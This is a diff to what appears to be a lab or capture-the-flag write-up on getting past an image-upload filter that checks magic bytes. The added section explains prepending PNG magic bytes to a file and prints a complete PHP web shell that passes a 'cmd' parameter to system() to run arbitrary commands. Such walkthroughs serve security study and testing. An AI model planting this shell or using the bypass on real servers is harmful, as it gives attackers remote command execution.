@@ -14,6 +14,28 @@ When examining the site or reviewing hidden cash files such as robots.txt or ins
 Verifies the file's digital signature, or Magic Bytes, to ensure it is a genuine image
 <img width="1599" height="781" alt="g" src="https://github.com/user-attachments/assets/67cb3115-011c-4326-9b78-e4d78afbaca6" />
 
+# Crafting the Payload
+to bypass filter we need add Magic Bytes to our file ,in our case we can add PNG on first line of file like this
+<img width="1598" height="825" alt="5" src="https://github.com/user-attachments/assets/f91fc941-3c75-472d-840f-00b94088b58e" />
+
+    <html>
+    <body>
+    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+    <input type="SUBMIT" value="Execute">
+    </form>
+    <pre>
+    <?php
+       if(isset($_GET['cmd']))
+      {
+          system($_GET['cmd'] . ' 2>&1');
+      }
+    ?>
+    </pre>
+    </body>
+    </html>
+
+
 
 
 
